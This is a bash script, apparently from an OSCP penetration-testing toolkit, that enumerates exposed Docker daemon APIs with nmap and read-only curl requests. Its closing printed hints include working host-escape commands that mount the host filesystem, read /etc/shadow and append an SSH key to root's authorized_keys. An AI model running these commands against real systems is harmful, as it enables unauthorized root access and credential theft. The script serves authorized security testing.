#!/usr/bin/env bash
# =============================================================================
#  wrappers/docker_enum.sh — Docker API Enumeration Wrapper
#  Tools: curl, nmap
#
#  Covers: Docker daemon on port 2375 (plain HTTP) and 2376 (TLS)
#
#  OSCP compliance:
#    - Read-only enumeration (no container creation/deletion)
#    - No command execution inside containers
#    - No modification of any host or container state
#    - Findings and exploitation paths provided as manual hints only
#    - Every command printed before execution
#
#  Usage:
#    bash wrappers/docker_enum.sh --target <IP> --output-dir <DIR> [--ports 2375,2376]
#
#  Output directory: <DIR>/docker/
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
# Disable ANSI colors when stdout is not a TTY (e.g. piped to Python)
[ -t 1 ] || { RED=""; GREEN=""; YELLOW=""; CYAN=""; WHITE=""; NC=""; BOLD=""; }

info() { echo -e "  ${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}[+]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }
err()  { echo -e "  ${RED}[-]${NC} $*"; }
cmd()  { echo -e "  ${YELLOW}[CMD]${NC} $*"; }
hint() { echo -e "\n  ${YELLOW}[MANUAL]${NC} $*\n"; }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }

has_port() { echo ",$PORTS," | grep -q ",$1,"; }

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
TARGET=""; OUTPUT_DIR=""; PORTS="2375,2376"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)     TARGET="$2";     shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --ports)      PORTS="$2";      shift 2 ;;
        *) err "Unknown argument: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" || -z "$OUTPUT_DIR" ]]; then
    err "Usage: $0 --target <IP> --output-dir <DIR> [--ports 2375,2376]"
    exit 1
fi

DOCKER_DIR="${OUTPUT_DIR}/docker"
mkdir -p "$DOCKER_DIR"

echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  DOCKER API ENUM — ${TARGET}${NC}"
echo -e "  ${BOLD}  Ports : ${PORTS}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
echo ""

# ---------------------------------------------------------------------------
# Enumerate each requested port
# ---------------------------------------------------------------------------
IFS=',' read -ra PORT_LIST <<< "$PORTS"

for PORT in "${PORT_LIST[@]}"; do
    PORT="${PORT// /}"   # trim whitespace
    [[ -z "$PORT" ]] && continue

    # Determine scheme based on port
    if [[ "$PORT" == "2376" ]]; then
        SCHEME="https"
    else
        SCHEME="http"
    fi

    echo ""
    echo -e "  ${BOLD}------------------------------------------------------------${NC}"
    echo -e "  ${BOLD}  Port ${PORT} (${SCHEME^^})${NC}"
    echo -e "  ${BOLD}------------------------------------------------------------${NC}"
    echo ""

    # =========================================================================
    # [1/5] Nmap Docker scripts
    # =========================================================================
    info "[1/5] Nmap Docker version script (port ${PORT})"
    NMAP_OUT="${DOCKER_DIR}/docker_nmap_${PORT}.txt"

    cmd "nmap -p${PORT} --script docker-version -Pn ${TARGET}"
    nmap -p"${PORT}" \
        --script 'docker-version' \
        -Pn "$TARGET" \
        -oN "$NMAP_OUT" 2>&1 | tee "$NMAP_OUT" || {
        warn "nmap (Docker port ${PORT}) failed — output may be incomplete. Check ${NMAP_OUT}."
    }

    # Flag if nmap confirmed Docker API
    if grep -qi "docker\|API version\|container" "$NMAP_OUT" 2>/dev/null; then
        ok "Nmap Docker fingerprint confirmed on port ${PORT} — review ${NMAP_OUT}"
    fi

    # =========================================================================
    # [2/5] Version info — detect if API responds
    # =========================================================================
    info "[2/5] Docker API version probe (port ${PORT})"
    VERSION_OUT="${DOCKER_DIR}/docker_version_${PORT}.txt"

    cmd "curl -sk --max-time 8 ${SCHEME}://${TARGET}:${PORT}/version"
    VERSION_JSON=$(curl -sk --max-time 8 \
        "${SCHEME}://${TARGET}:${PORT}/version" 2>/dev/null || true)
    echo "$VERSION_JSON" > "$VERSION_OUT"

    if echo "$VERSION_JSON" | grep -q '"Version"' 2>/dev/null; then
        ok "Docker API on port ${PORT} responded — API accessible"
        warn "Docker API exposed WITHOUT TLS client authentication — CRITICAL"

        # Extract key fields (graceful — || true guards set -e)
        DOCKER_VER=$(echo "$VERSION_JSON" | grep -oP '"Version"\s*:\s*"\K[^"]+' || true)
        API_VER=$(echo "$VERSION_JSON"    | grep -oP '"ApiVersion"\s*:\s*"\K[^"]+' || true)
        OS_VER=$(echo "$VERSION_JSON"     | grep -oP '"Os"\s*:\s*"\K[^"]+' || true)
        KERNEL_VER=$(echo "$VERSION_JSON" | grep -oP '"KernelVersion"\s*:\s*"\K[^"]+' || true)
        ARCH=$(echo "$VERSION_JSON"       | grep -oP '"Arch"\s*:\s*"\K[^"]+' || true)

        [[ -n "$DOCKER_VER" ]]  && ok "  Docker version  : ${WHITE}${DOCKER_VER}${NC}"
        [[ -n "$API_VER" ]]     && ok "  API version     : ${WHITE}${API_VER}${NC}"
        [[ -n "$OS_VER" ]]      && ok "  OS              : ${WHITE}${OS_VER}${NC}"
        [[ -n "$KERNEL_VER" ]]  && ok "  Kernel version  : ${WHITE}${KERNEL_VER}${NC}"
        [[ -n "$ARCH" ]]        && ok "  Architecture    : ${WHITE}${ARCH}${NC}"

        API_ACCESSIBLE=true
    else
        info "Docker API on port ${PORT} did not return valid JSON — may require TLS client cert or be closed."
        API_ACCESSIBLE=false
    fi

    # =========================================================================
    # [3/5] Container enumeration (only if API accessible)
    # =========================================================================
    info "[3/5] Container enumeration (port ${PORT})"
    CONTAINERS_OUT="${DOCKER_DIR}/docker_containers_${PORT}.txt"

    if [[ "$API_ACCESSIBLE" == "true" ]]; then
        # Running containers
        cmd "curl -sk --max-time 10 ${SCHEME}://${TARGET}:${PORT}/containers/json"
        RUNNING_JSON=$(curl -sk --max-time 10 \
            "${SCHEME}://${TARGET}:${PORT}/containers/json" 2>/dev/null || true)

        # All containers (including stopped)
        cmd "curl -sk --max-time 10 ${SCHEME}://${TARGET}:${PORT}/containers/json?all=1"
        ALL_JSON=$(curl -sk --max-time 10 \
            "${SCHEME}://${TARGET}:${PORT}/containers/json?all=1" 2>/dev/null || true)

        {
            echo "=== Running containers ==="
            echo "$RUNNING_JSON"
            echo ""
            echo "=== All containers (including stopped) ==="
            echo "$ALL_JSON"
        } > "$CONTAINERS_OUT"

        # Count running vs stopped
        RUNNING_COUNT=$(echo "$RUNNING_JSON" | grep -o '"Status"' 2>/dev/null | wc -l || true)
        ALL_COUNT=$(echo "$ALL_JSON"         | grep -o '"Status"' 2>/dev/null | wc -l || true)
        STOPPED_COUNT=$(( ALL_COUNT - RUNNING_COUNT )) || true

        ok "Containers — running: ${WHITE}${RUNNING_COUNT}${NC}, stopped: ${WHITE}${STOPPED_COUNT}${NC}"
        ok "Full container list → ${CONTAINERS_OUT}"

        # Critical: host root mount
        if echo "$ALL_JSON" | grep -qP '"Source"\s*:\s*"/"' 2>/dev/null; then
            warn "CRITICAL: Container has host root (/) mounted — host escape trivial!"
        fi || true

        # Critical: privileged containers
        if echo "$ALL_JSON" | grep -qi '"Privileged"\s*:\s*true' 2>/dev/null; then
            warn "Privileged container detected — host escape possible via /dev/mem or cgroup"
        fi || true

        # Extract image names and ports for quick view
        IMAGES_USED=$(echo "$ALL_JSON" | grep -oP '"Image"\s*:\s*"\K[^"]+' 2>/dev/null \
            | sort -u | head -10 || true)
        [[ -n "$IMAGES_USED" ]] && ok "  Images in use   : ${WHITE}${IMAGES_USED//$'\n'/, }${NC}" || true

        # Detect mounted paths (Mounts[].Source)
        MOUNTS=$(echo "$ALL_JSON" | grep -oP '"Source"\s*:\s*"\K[^"]+' 2>/dev/null \
            | sort -u | head -20 || true)
        if [[ -n "$MOUNTS" ]]; then
            ok "  Volume mounts found:"
            echo "$MOUNTS" | while IFS= read -r mount_path; do
                if [[ "$mount_path" == "/" ]]; then
                    warn "    HOST ROOT mounted: ${WHITE}${mount_path}${NC}"
                else
                    info "    ${mount_path}"
                fi
            done
        fi || true

    else
        info "Skipping container enumeration — API not accessible on port ${PORT}."
        echo "(API not accessible)" > "$CONTAINERS_OUT"
    fi

    # =========================================================================
    # [4/5] Image enumeration
    # =========================================================================
    info "[4/5] Image enumeration (port ${PORT})"
    IMAGES_OUT="${DOCKER_DIR}/docker_images_${PORT}.txt"

    if [[ "$API_ACCESSIBLE" == "true" ]]; then
        cmd "curl -sk --max-time 10 ${SCHEME}://${TARGET}:${PORT}/images/json"
        IMAGES_JSON=$(curl -sk --max-time 10 \
            "${SCHEME}://${TARGET}:${PORT}/images/json" 2>/dev/null || true)
        echo "$IMAGES_JSON" > "$IMAGES_OUT"

        IMAGE_COUNT=$(echo "$IMAGES_JSON" | grep -o '"Id"' 2>/dev/null | wc -l || true)
        ok "Images found: ${WHITE}${IMAGE_COUNT}${NC} → ${IMAGES_OUT}"

        # List first 10 image tags
        IMAGE_TAGS=$(echo "$IMAGES_JSON" | grep -oP '"RepoTags"\s*:\s*\["\K[^"]+' \
            2>/dev/null | head -10 || true)
        if [[ -n "$IMAGE_TAGS" ]]; then
            ok "  RepoTags (first 10):"
            echo "$IMAGE_TAGS" | while IFS= read -r tag; do
                info "    ${tag}"
            done
        fi || true
    else
        info "Skipping image enumeration — API not accessible on port ${PORT}."
        echo "(API not accessible)" > "$IMAGES_OUT"
    fi

    # =========================================================================
    # [5/5] Additional endpoints
    # =========================================================================
    info "[5/5] Additional Docker API endpoints (port ${PORT})"

    if [[ "$API_ACCESSIBLE" == "true" ]]; then
        # /info — system-wide daemon info, plugins, swarm status
        INFO_OUT="${DOCKER_DIR}/docker_info_${PORT}.txt"
        cmd "curl -sk --max-time 10 ${SCHEME}://${TARGET}:${PORT}/info"
        curl -sk --max-time 10 \
            "${SCHEME}://${TARGET}:${PORT}/info" \
            2>/dev/null | tee "$INFO_OUT" || true
        ok "Daemon info → ${INFO_OUT}"

        # Extract swarm status and interesting fields
        SWARM_STATUS=$(grep -oP '"LocalNodeState"\s*:\s*"\K[^"]+' "$INFO_OUT" 2>/dev/null || true)
        [[ -n "$SWARM_STATUS" ]] && info "  Swarm status: ${WHITE}${SWARM_STATUS}${NC}" || true

        CONTAINERS_TOTAL=$(grep -oP '"Containers"\s*:\s*\K\d+' "$INFO_OUT" 2>/dev/null | head -1 || true)
        [[ -n "$CONTAINERS_TOTAL" ]] && info "  Total containers: ${WHITE}${CONTAINERS_TOTAL}${NC}" || true

        # /networks — Docker network list
        NETWORKS_OUT="${DOCKER_DIR}/docker_networks_${PORT}.txt"
        cmd "curl -sk --max-time 10 ${SCHEME}://${TARGET}:${PORT}/networks"
        curl -sk --max-time 10 \
            "${SCHEME}://${TARGET}:${PORT}/networks" \
            2>/dev/null | tee "$NETWORKS_OUT" || true
        ok "Network list → ${NETWORKS_OUT}"

        NETWORK_NAMES=$(grep -oP '"Name"\s*:\s*"\K[^"]+' "$NETWORKS_OUT" 2>/dev/null \
            | head -10 || true)
        [[ -n "$NETWORK_NAMES" ]] && \
            ok "  Networks: ${WHITE}${NETWORK_NAMES//$'\n'/, }${NC}" || true

        # /_ping — simple health check
        PING_OUT="${DOCKER_DIR}/docker_ping_${PORT}.txt"
        cmd "curl -sk --max-time 5 ${SCHEME}://${TARGET}:${PORT}/_ping"
        PING_RESP=$(curl -sk --max-time 5 \
            "${SCHEME}://${TARGET}:${PORT}/_ping" 2>/dev/null || true)
        echo "$PING_RESP" > "$PING_OUT"
        [[ "$PING_RESP" == "OK" ]] && ok "Docker /_ping → ${WHITE}OK${NC} (daemon healthy)" || true

    else
        info "Skipping additional endpoints — API not accessible on port ${PORT}."
    fi

    # =========================================================================
    # Manual exploitation hints (printed always if port was in scope)
    # =========================================================================
    hint "Docker API manual steps (port ${PORT}):
  # Quick connectivity check:
  curl -sk ${SCHEME}://${TARGET}:${PORT}/version
  curl -sk ${SCHEME}://${TARGET}:${PORT}/_ping

  # List running containers:
  curl -sk ${SCHEME}://${TARGET}:${PORT}/containers/json | python3 -m json.tool
  curl -sk '${SCHEME}://${TARGET}:${PORT}/containers/json?all=1' | python3 -m json.tool

  # List images:
  curl -sk ${SCHEME}://${TARGET}:${PORT}/images/json | python3 -m json.tool

  # Daemon info:
  curl -sk ${SCHEME}://${TARGET}:${PORT}/info | python3 -m json.tool

  # Using the Docker CLI directly:
  docker -H tcp://${TARGET}:${PORT} ps
  docker -H tcp://${TARGET}:${PORT} ps -a
  docker -H tcp://${TARGET}:${PORT} images
  docker -H tcp://${TARGET}:${PORT} network ls"

    hint "Docker host escape (MANUAL ONLY — confirm OSCP exam scope before using):

  # Mount host filesystem into a new container and chroot into it:
  docker -H tcp://${TARGET}:${PORT} run -v /:/mnt --rm -it alpine chroot /mnt sh

  # Read /etc/shadow from host:
  docker -H tcp://${TARGET}:${PORT} run -v /etc:/mnt/etc --rm alpine cat /mnt/etc/shadow

  # Add your SSH public key to root's authorized_keys:
  docker -H tcp://${TARGET}:${PORT} run -v /root/.ssh:/mnt/ssh --rm alpine \\
    sh -c 'echo \"<your_pubkey>\" >> /mnt/ssh/authorized_keys'

  # Via API directly (create + start + exec — three-step):
  # Step 1 — create container with host root mounted:
  curl -sk -X POST ${SCHEME}://${TARGET}:${PORT}/containers/create \\
    -H 'Content-Type: application/json' \\
    -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/mnt\",\"ReadWrite\":true}],\"Tty\":true}'
  # Step 2 — start it (replace <ID> with Id from step 1):
  curl -sk -X POST ${SCHEME}://${TARGET}:${PORT}/containers/<ID>/start
  # Step 3 — exec a command inside:
  curl -sk -X POST ${SCHEME}://${TARGET}:${PORT}/containers/<ID>/exec \\
    -H 'Content-Type: application/json' \\
    -d '{\"AttachStdout\":true,\"AttachStderr\":true,\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /mnt/etc/shadow\"]}'

  WARNING: Steps above CREATE a container — exploitation, not enumeration.
  Only perform if explicitly authorized in your OSCP exam rules of engagement."

    echo ""

done  # end PORT loop

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
ok "Docker API enumeration complete — output: ${DOCKER_DIR}/"
echo ""
